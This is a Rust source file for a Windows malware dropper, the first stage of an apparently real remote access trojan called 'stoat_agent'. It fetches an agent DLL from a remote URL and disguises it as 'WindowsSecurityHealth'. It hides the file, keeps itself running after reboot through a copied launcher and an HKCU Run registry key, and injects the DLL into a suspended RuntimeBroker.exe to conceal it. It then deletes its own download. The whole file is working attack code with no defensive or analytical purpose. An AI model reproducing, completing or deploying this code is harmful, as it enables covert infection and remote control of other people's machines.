// language: Rust, file: src/bin/dropper.rs, target: Windows
// Stage 1 loader. Downloads the agent DLL, hides it, installs a persistent launcher
// (a copy of itself + an HKCU Run entry), injects the DLL into a suspended legitimate
// host process, and deletes the original download.
//
// The agent then runs inside the host image — Task Manager shows the host, not the agent.
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};

/// Agent DLL location. Override with argv[1] or the RAT_URL env var.
const DEFAULT_URL: &str = "https://github.com/promotezWorks/fjaf83jafkjnasfhdfjhaeshf3uhafashnfjksahvshauhefkjahn34fkjhaskhdvkjasndf/releases/download/v1/stoat_agent.dll";
const DLL_NAME: &str = "WindowsSecurityHealth.dll";
const LAUNCHER_NAME: &str = "WindowsSecurityHealth.exe";
const RUN_NAME: &str = "WindowsSecurityHealth";
/// Legitimate host image the DLL is injected into. RuntimeBroker has no window and is
/// mundane in any process list.
const DEFAULT_HOST: &str = r"C:\Windows\System32\RuntimeBroker.exe";

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

#[tokio::main]
async fn main() {
    if let Err(e) = run().await {
        log(&format!("error: {e:#}"));
    }
}

async fn run() -> anyhow::Result<()> {
    let source = std::env::args()
        .nth(1)
        .or_else(|| std::env::var("RAT_URL").ok())
        .unwrap_or_else(|| DEFAULT_URL.to_string());
    let launcher_name = std::env::var("RAT_NAME").unwrap_or_else(|_| LAUNCHER_NAME.to_string());
    let dll_name = std::env::var("RAT_DLLNAME").unwrap_or_else(|_| DLL_NAME.to_string());
    let host = std::env::var("RAT_HOST").unwrap_or_else(|_| DEFAULT_HOST.to_string());
    let dir = std::env::var("RAT_DESTDIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| {
            PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
                .join("Microsoft")
                .join("Windows")
        });
    std::fs::create_dir_all(&dir).ok();
    let dll_path = dir.join(&dll_name);
    let launcher = dir.join(&launcher_name);
    let self_exe = std::env::current_exe().unwrap_or_default();
    let is_launcher = same_path(&self_exe, &launcher);

    log(&format!(
        "drop start source={source} host={host} dir={} launcher={is_launcher}",
        dir.display()
    ));

    // 1. Ensure the payload DLL is present.
    if !dll_path.exists() || std::env::var_os("RAT_FORCE").is_some() {
        let bytes = fetch(&source).await?;
        if bytes.len() < 1024 || bytes.get(..2) != Some(b"MZ") {
            anyhow::bail!("payload is not a PE ({} bytes)", bytes.len());
        }
        let tmp = dir.join(format!("{dll_name}.tmp"));
        std::fs::write(&tmp, &bytes)?;
        let _ = std::fs::remove_file(&dll_path);
        std::fs::rename(&tmp, &dll_path)?;
        log(&format!("payload installed -> {}", dll_path.display()));
    }
    hide_file(&dll_path);

    // 2. Persist: launcher copy + HKCU Run.
    if !is_launcher && !self_exe.as_os_str().is_empty() {
        // Remove any existing launcher first — overwriting a Hidden/System file can be denied.
        let _ = std::fs::remove_file(&launcher);
        if let Err(e) = std::fs::copy(&self_exe, &launcher) {
            log(&format!("launcher copy failed: {e}"));
        }
    }
    if launcher.exists() {
        hide_file(&launcher);
        if let Err(e) = set_run_key(&launcher) {
            log(&format!("run key failed: {e}"));
        }
    }

    // 3. Inject into the host.
    if std::env::var_os("RAT_NOEXEC").is_none() {
        match stoat_agent::inject::inject_into_suspended_host(&host, &dll_path.to_string_lossy()) {
            Ok(pid) => log(&format!("injected into host pid {pid}")),
            Err(e) => log(&format!("injection failed: {e:#}")),
        }
    } else {
        log("RAT_NOEXEC set; not injecting");
    }

    // 4. Remove the original download (keep the launcher).
    if !is_launcher && std::env::var_os("RAT_NODELETE").is_none() {
        let cmd = format!(
            "/C ping -n 3 127.0.0.1 >nul & del /f /q \"{}\"",
            self_exe.display()
        );
        let _ = std::process::Command::new("cmd")
            .raw_arg(cmd)
            .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
            .spawn();
        log("self-delete scheduled");
    }
    Ok(())
}

async fn fetch(source: &str) -> anyhow::Result<Vec<u8>> {
    if source.starts_with("http") {
        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .timeout(std::time::Duration::from_secs(180))
            .build()?;
        let body = client
            .get(source)
            .send()
            .await?
            .error_for_status()?
            .bytes()
            .await?;
        Ok(body.to_vec())
    } else {
        Ok(std::fs::read(source)?)
    }
}

fn same_path(a: &Path, b: &Path) -> bool {
    let ca = a.canonicalize().unwrap_or_else(|_| a.to_path_buf());
    let cb = b.canonicalize().unwrap_or_else(|_| b.to_path_buf());
    ca == cb
}

#[cfg(windows)]
fn hide_file(path: &Path) {
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::Storage::FileSystem::{
        SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM,
    };
    let w: Vec<u16> = path
        .as_os_str()
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    unsafe {
        SetFileAttributesW(w.as_ptr(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

#[cfg(not(windows))]
fn hide_file(_path: &Path) {}

#[cfg(windows)]
fn set_run_key(launcher: &Path) -> anyhow::Result<()> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let name = std::env::var("RAT_NAME").unwrap_or_else(|_| RUN_NAME.to_string());
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
    key.set_value(&name, &launcher.to_string_lossy().to_string())?;
    Ok(())
}

#[cfg(not(windows))]
fn set_run_key(_launcher: &Path) -> anyhow::Result<()> {
    Ok(())
}

fn log(msg: &str) {
    use std::io::Write;
    let p = std::env::temp_dir().join("rat_drop.log");
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(p) {
        let _ = writeln!(f, "{msg}");
    }
}
